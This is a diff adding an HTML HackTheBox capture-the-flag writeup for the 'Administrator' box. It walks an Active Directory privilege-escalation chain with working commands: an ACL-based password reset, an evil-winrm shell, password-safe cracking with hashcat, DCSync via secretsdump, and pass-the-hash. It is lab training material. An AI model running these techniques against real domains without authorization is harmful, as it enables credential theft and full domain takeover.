@@ -1,0 +1,263 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Administrator — HTB Writeup</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel2:#1c2330; --border:#2a3240;
+    --text:#e6edf3; --muted:#8b98a9; --accent:#3fb950; --accent2:#58a6ff;
+    --warn:#d29922; --danger:#f85149; --chip:#21262d; --code:#0b0f14;
+    --mono:'JetBrains Mono','Fira Code',ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    --sans:system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0;background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.6;}
+  a{color:var(--accent2);text-decoration:none}
+  a:hover{text-decoration:underline}
+  .wrap{max-width:860px;margin:0 auto;padding:16px;}
+
+  header.hero{
+    border:1px solid var(--border);border-radius:14px;overflow:hidden;margin:24px 0 20px;
+    background:linear-gradient(135deg,#11161d 0%,#0d1117 60%);
+  }
+  .hero-top{padding:28px 28px 20px;border-bottom:1px solid var(--border);}
+  .kicker{font-family:var(--mono);font-size:.75rem;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin:0 0 8px}
+  .hero h1{margin:0;font-size:2.1rem;letter-spacing:-.02em;}
+  .hero h1 .owned{color:var(--accent)}
+  .sub{color:var(--muted);margin:6px 0 0;font-size:.95rem}
+  .meta{display:flex;flex-wrap:wrap;gap:10px;padding:18px 28px;background:var(--panel);}
+  .meta .m{font-size:.8rem}
+  .meta .m b{display:block;color:var(--muted);font-weight:600;font-size:.68rem;text-transform:uppercase;letter-spacing:.08em;margin-bottom:3px}
+  .meta .m span{font-family:var(--mono)}
+
+  .badges{display:flex;flex-wrap:wrap;gap:8px;margin:18px 0 6px}
+  .badge{font-family:var(--mono);font-size:.72rem;padding:4px 10px;border-radius:999px;background:var(--chip);border:1px solid var(--border);color:var(--muted)}
+  .badge.win{color:#58a6ff;border-color:#1f4a7a}
+  .badge.med{color:var(--warn);border-color:#5a4714}
+  .badge.pwn{color:var(--accent);border-color:#1f5a2c}
+
+  section{margin:34px 0}
+  h2{font-size:1.25rem;letter-spacing:-.01em;margin:0 0 4px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
+  h2 .num{font-family:var(--mono);font-size:.85rem;color:var(--accent);background:var(--panel2);border:1px solid var(--border);border-radius:7px;padding:2px 9px}
+  h3{font-size:1rem;margin:22px 0 6px;color:var(--text)}
+  p{margin:10px 0}
+  .lead{color:var(--muted)}
+
+  pre{background:var(--code);border:1px solid var(--border);border-radius:10px;padding:14px 16px;overflow-x:auto;margin:12px 0;}
+  code{font-family:var(--mono);font-size:.85rem}
+  pre code{color:#d9e1ea}
+  p code,li code{background:var(--chip);border:1px solid var(--border);border-radius:5px;padding:1px 6px;font-size:.82rem;color:#ffd9a6}
+  .cmt{color:var(--muted)}
+  .prompt{color:var(--accent)}
+
+  /* chain timeline */
+  .chain{list-style:none;padding:0;margin:14px 0;position:relative}
+  .chain:before{content:"";position:absolute;left:15px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--accent),var(--accent2))}
+  .chain li{position:relative;padding:0 0 20px 46px}
+  .chain li:last-child{padding-bottom:0}
+  .chain .dot{position:absolute;left:6px;top:0;width:20px;height:20px;border-radius:50%;background:var(--panel2);border:2px solid var(--accent);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:.62rem;color:var(--accent);font-weight:700}
+  .chain .step-h{font-weight:600;margin:0}
+  .chain .step-d{color:var(--muted);font-size:.9rem;margin:3px 0 0}
+  .chain .pill{display:inline-block;font-family:var(--mono);font-size:.68rem;background:var(--chip);border:1px solid var(--border);border-radius:5px;padding:1px 7px;margin:4px 6px 0 0;color:var(--accent2)}
+
+  .callout{border:1px solid var(--border);border-left:3px solid var(--accent2);background:var(--panel);border-radius:0 10px 10px 0;padding:12px 16px;margin:14px 0}
+  .callout.warn{border-left-color:var(--warn)}
+  .callout.danger{border-left-color:var(--danger)}
+  .callout .t{font-weight:700;font-size:.8rem;text-transform:uppercase;letter-spacing:.06em;margin:0 0 4px}
+  .callout.warn .t{color:var(--warn)}
+  .callout.danger .t{color:var(--danger)}
+  .callout p{margin:4px 0}
+
+  table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.88rem}
+  th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--border)}
+  th{color:var(--muted);font-size:.72rem;text-transform:uppercase;letter-spacing:.07em}
+  td code{font-size:.8rem}
+  tr:hover td{background:var(--panel)}
+
+  .cred{font-family:var(--mono);color:var(--accent)}
+
+  footer{margin:40px 0 24px;padding-top:16px;border-top:1px solid var(--border);color:var(--muted);font-size:.8rem;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
+
+  @media (max-width:560px){ .hero h1{font-size:1.6rem} .hero-top,.meta{padding-left:18px;padding-right:18px} }
+  @media print{ body{background:#fff;color:#000} .wrap{max-width:100%} pre,table,.callout,.meta,header.hero{break-inside:avoid} a{color:#000} }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="hero">
+    <div class="hero-top">
+      <p class="kicker">HackTheBox · Writeup</p>
+      <h1>Administrator <span class="owned">// rooted</span></h1>
+      <p class="sub">Active Directory privilege-escalation chain: ACL abuse → Password Safe → DCSync → Pass-the-Hash.</p>
+      <div class="badges">
+        <span class="badge win">Windows / AD</span>
+        <span class="badge med">Difficulty: Medium</span>
+        <span class="badge pwn">User + Root</span>
+        <span class="badge">Domain Controller</span>
+      </div>
+    </div>
+    <div class="meta">
+      <div class="m"><b>Target</b><span>10.129.84.158</span></div>
+      <div class="m"><b>Domain</b><span>administrator.htb</span></div>
+      <div class="m"><b>Host</b><span>DC.administrator.htb</span></div>
+      <div class="m"><b>Date</b><span>2026-11-06</span></div>
+    </div>
+  </header>
+
+  <section>
+    <h2>Overview</h2>
+    <p class="lead">A full-stack domain controller exposing the usual AD surface (SMB, LDAP, Kerberos, WinRM, FTP, ADCS endpoints). Starting from a single low-privilege credential, the box is solved by walking an <strong>object-control graph</strong> in BloodHound — each account controls the next via a Windows ACL edge — until a user with <strong>DCSync</strong> rights allows replicating the Administrator hash straight out of NTDS.dit.</p>
+    <div class="callout">
+      <p class="t">TL;DR path</p>
+      <p><span class="cred">olivia</span> → <span class="cred">michael</span> → <span class="cred">benjamin</span> → <span class="cred">ethan</span> → <span class="cred">Administrator</span></p>
+    </div>
+  </section>
+
+  <section>
+    <h2>Recon</h2>
+    <p>Full AD DC stack open: <code>21/ftp</code>, <code>53</code>, <code>88/kerberos</code>, <code>135/139/445/smb</code>, <code>389/3268/ldap</code>, <code>464</code>, <code>593</code>, <code>636/ldaps</code>, <code>5985/winrm</code>, <code>9389</code> + high RPC ports. SMB signing required (no relay).</p>
+    <pre><code><span class="prompt">$</span> echo "10.129.84.158 administrator.htb DC.administrator.htb DC" | sudo tee -a /etc/hosts
+<span class="prompt">$</span> sudo ntpdate -u 10.129.84.158   <span class="cmt"># sync clock → avoid Kerberos KRB_AP_ERR_SKEW</span>
+<span class="prompt">$</span> nxc smb 10.129.84.158 -u olivia -p 'ichlie******'   <span class="cmt"># foothold cred valid</span></code></pre>
+    <p>Initial credential <span class="cred">olivia : ichlie******</span> — valid over SMB (default access only), no WinRM, no FTP. BloodHound CE data collected and olivia marked <em>Owned</em>.</p>
+  </section>
+
+  <section>
+    <h2><span class="num">chain</span> The ACL chain</h2>
+    <ol class="chain">
+      <li>
+        <span class="dot">1</span>
+        <p class="step-h">olivia &rarr; michael — GenericAll</p>
+        <p class="step-d">olivia holds full control over michael. Kerberoast (TGS uncrackable) and Certipy shadow-credentials (LDAPS reset) both stalled, so fell back to a direct password reset via bloodyAD — the guaranteed-progress primitive of GenericAll.</p>
+        <span class="pill">GenericAll</span><span class="pill">ForceChangePassword</span>
+      </li>
+      <li>
+        <span class="dot">2</span>
+        <p class="step-h">michael — WinRM shell + user flag</p>
+        <p class="step-d">michael is a member of <strong>Remote Management Users</strong>, granting interactive WinRM access.</p>
+        <span class="pill">Remote Management Users</span><span class="pill">evil-winrm</span>
+      </li>
+      <li>
+        <span class="dot">3</span>
+        <p class="step-h">michael &rarr; benjamin — control edge</p>
+        <p class="step-d">From michael, BloodHound shows outbound control over benjamin. Unlike olivia, benjamin has <strong>FTP</strong> access — the intended door to the backup.</p>
+        <span class="pill">FTP access</span>
+      </li>
+      <li>
+        <span class="dot">4</span>
+        <p class="step-h">benjamin — loot Backup.psafe3</p>
+        <p class="step-d">A Password Safe v3 database sitting on the FTP server. Pulled in <strong>binary</strong> mode (ASCII mode corrupts binary files).</p>
+        <span class="pill">Password Safe v3</span>
+      </li>
+      <li>
+        <span class="dot">5</span>
+        <p class="step-h">crack master &rarr; ethan : limpb*****</p>
+        <p class="step-d">Cracked the safe's master password offline; opening it revealed stored domain credentials for ethan.</p>
+        <span class="pill">pwsafe2john</span><span class="pill">hashcat -m 5200</span>
+      </li>
+      <li>
+        <span class="dot">6</span>
+        <p class="step-h">ethan — DCSync &rarr; root</p>
+        <p class="step-d">ethan holds replication rights (<code>DS-Replication-Get-Changes</code> + <code>-All</code>) over the domain. secretsdump replicates the Administrator NT hash; pass-the-hash for the final shell and root flag.</p>
+        <span class="pill">DCSync</span><span class="pill">Pass-the-Hash</span>
+      </li>
+    </ol>
+  </section>
+
+  <section>
+    <h2><span class="num">1</span> olivia &rarr; michael</h2>
+    <p>Force-reset michael's password using olivia's GenericAll (binds LDAP/389 with signing — sidesteps the broken LDAPS 636 handshake that Certipy hit):</p>
+    <pre><code><span class="prompt">$</span> bloodyAD -u olivia -p 'ichlie******' -d administrator.htb \
+      --host 10.129.84.158 set password michael 'NewPas*****'</code></pre>
+    <div class="callout">
+      <p class="t">Why not Kerberoast / shadow creds?</p>
+      <p>GenericAll over a user gives three interchangeable primitives: targeted Kerberoast, shadow credentials, and force reset. The first two failed here (uncrackable TGS; LDAPS reset), so the reset — loud but reliable — carried the chain.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2><span class="num">2</span> michael &rarr; WinRM + user.txt</h2>
+    <pre><code><span class="prompt">$</span> nxc winrm 10.129.84.158 -u michael -p 'NewPas*****'   <span class="cmt"># (Pwn3d!)</span>
+<span class="prompt">$</span> evil-winrm -i 10.129.84.158 -u michael -p 'NewPas*****'
+<span class="prompt">*Evil-WinRM*</span> type C:\Users\michael\Desktop\user.txt</code></pre>
+    <div class="callout warn">
+      <p class="t">Group membership ≠ a fixed login</p>
+      <p>Remote Management Users is <em>authorization</em>. A failing login is <em>authentication</em> — check the credential (case, quoting, password-vs-hash) before blaming permissions. <code>data 52e</code> always means bad creds.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2><span class="num">3–4</span> benjamin &rarr; FTP &rarr; Backup.psafe3</h2>
+    <pre><code><span class="prompt">$</span> ftp 10.129.84.158
+<span class="prompt">ftp></span> binary            <span class="cmt"># critical: exact byte copy, no \n translation</span>
+<span class="prompt">ftp></span> ls -la
+<span class="prompt">ftp></span> get Backup.psafe3
+<span class="prompt">ftp></span> bye
+<span class="prompt">$</span> file Backup.psafe3   <span class="cmt"># verify it's a real Password Safe DB, not "data"</span></code></pre>
+  </section>
+
+  <section>
+    <h2><span class="num">5</span> Crack the Password Safe</h2>
+    <pre><code><span class="prompt">$</span> pwsafe2john Backup.psafe3 > pwsafe.hash
+<span class="prompt">$</span> hashcat -m 5200 pwsafe.hash /usr/share/wordlists/rockyou.txt
+<span class="cmt"># master password → tekier******</span>
+<span class="prompt">$</span> # open the safe and read stored entries:
+<span class="prompt">$</span> python3 -c "from pypwsafe import PWSafe3; db=PWSafe3('Backup.psafe3', password='tekier******'); \
+    [print(r.getTitle(), r.getUsername(), r.getPassword()) for r in db.records]"</code></pre>
+    <p>The master password itself isn't the prize — the <strong>stored entries</strong> are. The safe yielded <span class="cred">ethan : limpb*****</span>.</p>
+  </section>
+
+  <section>
+    <h2><span class="num">6</span> DCSync &rarr; Pass-the-Hash &rarr; root</h2>
+    <p>ethan holds replication rights over the domain. Replicate the directory's secrets:</p>
+    <pre><code><span class="prompt">$</span> impacket-secretsdump 'administrator.htb/ethan:limpb*****@10.129.84.158'
+<span class="cmt"># ...
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20b****************:::</span></code></pre>
+    <p>The right half is Administrator's NT hash. NTLM authenticates with the hash directly — no cracking needed:</p>
+    <pre><code><span class="prompt">$</span> evil-winrm -i 10.129.84.158 -u Administrator -H 3dc553ce4b9fd20b****************
+<span class="prompt">*Evil-WinRM*</span> type C:\Users\Administrator\Desktop\root.txt   <span class="cmt"># &#127937;</span></code></pre>
+    <div class="callout danger">
+      <p class="t">Don't crack an NTLM hash</p>
+      <p>The <code>aad3b4…</code> left half is the empty LM hash (noise). DCSync → Pass-the-Hash is the point: recovering plaintext buys nothing, and feeding <code>LM:NT</code> to <code>hashcat -m 0</code> throws a token-length error. Use the NT half with <code>-m 1000</code> only if plaintext is genuinely required.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>Credentials recovered</h2>
+    <table>
+      <thead><tr><th>Principal</th><th>Secret</th><th>Via</th></tr></thead>
+      <tbody>
+        <tr><td>olivia</td><td><code>ichlie******</code></td><td>Given foothold</td></tr>
+        <tr><td>michael</td><td><code>NewPas*****</code></td><td>GenericAll force-reset</td></tr>
+        <tr><td>benjamin</td><td><em>control edge</em></td><td>michael &rarr; FTP access</td></tr>
+        <tr><td>ethan</td><td><code>limpb*****</code></td><td>Password Safe (master: tekier******)</td></tr>
+        <tr><td>Administrator</td><td><code>NT: 3dc553ce4b9fd20b****************</code></td><td>DCSync via ethan</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section>
+    <h2>Lessons &amp; gotchas</h2>
+    <ul>
+      <li><strong>ACL abuse is a graph, not a command.</strong> Each hop answers "what does this node control next?" — mark owned, read outbound control, repeat.</li>
+      <li><strong>GenericAll has three interchangeable primitives</strong> (Kerberoast / shadow creds / force reset). When one stalls, fall back — don't get stuck cracking an uncrackable TGS.</li>
+      <li><strong>NTLM hashes are for passing, not cracking.</strong> DCSync → PtH ends the box; plaintext is irrelevant.</li>
+      <li><code>data 52e</code> = bad credentials, always. It caught a <code>NewPas*****</code> vs <code>Newpas*****</code> typo and a <code>pass@host</code> quoting bug.</li>
+      <li><strong>Clock skew</strong> silently breaks Kerberos — <code>sudo ntpdate -u &lt;dc-ip&gt;</code> at session start.</li>
+      <li><strong>FTP binary mode</strong> before pulling any non-text loot — ASCII mode corrupts <code>.psafe3</code>/<code>.kdbx</code>/archives.</li>
+      <li>Run impacket via the packaged <code>impacket-secretsdump</code>, not <code>examples/secretsdump.py</code>, to avoid module-path errors.</li>
+    </ul>
+  </section>
+
+  <footer>
+    <span>Administrator · HackTheBox · Windows AD</span>
+    <span>Authorized lab engagement — educational writeup</span>
+  </footer>
+
+</div>
+</body>
+</html>
